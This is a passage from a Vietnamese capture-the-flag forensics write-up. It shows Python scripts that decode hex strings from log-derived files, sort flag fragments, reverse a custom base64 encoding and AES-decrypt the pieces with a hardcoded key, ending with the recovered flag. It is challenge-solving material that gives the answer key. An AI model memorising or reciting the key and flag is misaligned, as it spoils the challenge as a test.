            ascii_value = hex_to_ascii(hex_values_cleaned)

            if ascii_value is not None:
                results.append(f'Decoded Key: {decoded_key.decode("utf-8", errors="replace")} | ASCII Value: {ascii_value}')

    return results

file_path = 'b.txt'
output = process_file(file_path)

for result in output:
    print(result)
```
Với `b.txt` là kết quả `format` ảnh trước đó.
Lần này thì ra 

![image](https://hackmd.io/_uploads/ry4-a3Wk1e.png)

Sau đó mình sắp xếp lại theo thứ tự bằng 
```python=
# Đọc dữ liệu từ file c.txt
with open("c.txt", "r") as file:
    decoded_keys = file.readlines()

decoded_keys = [key.strip() for key in decoded_keys]

sorted_keys = sorted(decoded_keys, key=lambda x: int(x.split('_')[1].split('.')[0]))

with open("sorted_flags.txt", "w") as f:
    for key in sorted_keys:
        f.write(key + "\n")

print("Đã lưu vào 'sorted_flags.txt'!")
```
Với `c.txt` kết quả từ ảnh trước.

![image](https://hackmd.io/_uploads/ryDTTnWk1l.png)

Lần này thì đã đỡ hơn

Sau đó tôi dùng `script` khác để chỉ lấy giá trị để giải mã 

```python=
# Đọc nội dung từ file c.txt
with open('sorted_flags.txt', 'r', encoding='utf-8') as file:
    lines = file.readlines()

with open('output.txt', 'w', encoding='utf-8') as output_file:
    for line in lines:
        if "ASCII Value:" in line:
            ascii_value = line.split("ASCII Value:")[1].strip()
            output_file.write(ascii_value + '\n')

print("Các chuỗi đã được ghi vào file output.txt.")
```
Với `sorted_flags.txt` là nội dung `output` trước đó và kết quả lần này là 

![image](https://hackmd.io/_uploads/B1Tzy6b1kl.png)

Đã như ý, vậy thì làm script cuối cùng để lấy flag thoi

```python=
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def reverse_r64_encoder(encoded_data):
    reversed_data = encoded_data[::-1]
    replaced_data = reversed_data.replace('-', 'C').replace('_', 'E')
    
    padding = 4 - (len(replaced_data) % 4)
    if padding < 4:
        replaced_data += '=' * padding

    return replaced_data 

def aes_decrypt(encrypted_text, key):
    key_hash = SHA256.new(key.encode('utf-8')).digest()

    encrypted_bytes = base64.b64decode(encrypted_text)
    
    iv = encrypted_bytes[:16]
    cipher_text = encrypted_bytes[16:]
    
    cipher = AES.new(key_hash, AES.MODE_CBC, iv)
    
    decrypted_bytes = cipher.decrypt(cipher_text)
    
    pad_len = decrypted_bytes[-1]
    decrypted_bytes = decrypted_bytes[:-pad_len]

    return decrypted_bytes.decode('utf-8')

with open('output.txt', 'r') as file:
    lines = file.readlines()

decoded_output = ''
for line in lines:
    line = line.strip()
    if line: 
        replaced_line = reverse_r64_encoder(line)
        plain = aes_decrypt(replaced_line,"YaMfem0zr4jdiZsDUxv1TH69")
        decoded_output += plain

print(decoded_output)

# Flag = ASCIS{N0th1n9_1$_m0r3_pr3c10u5_7h4n_1ndEp3ndenc3_&_fr33d0m}
```
Với `output.txt` là nội dung ảnh trước đó. Và cuối cùng đã có flag :v: 
### NOTE
Lí do lựa chọn các đoạn 
![image](https://hackmd.io/_uploads/r1P1epZyJx.png)

để giải mã là vì theo file `logs` ta có thể thấy các file `flag_[1-59].txt.enc` là những tiến trình xảy ra sát cạnh nhau nên có thể tự `filter` bằng cách lấy tên file cận trên và cận dưới để giải mã riêng đến khi đúng thứ tự trong `logs` là đủ  (Vì chỉ là 1 phần kí tự của flag thoi nên sẽ ngắn và dễ chọn).



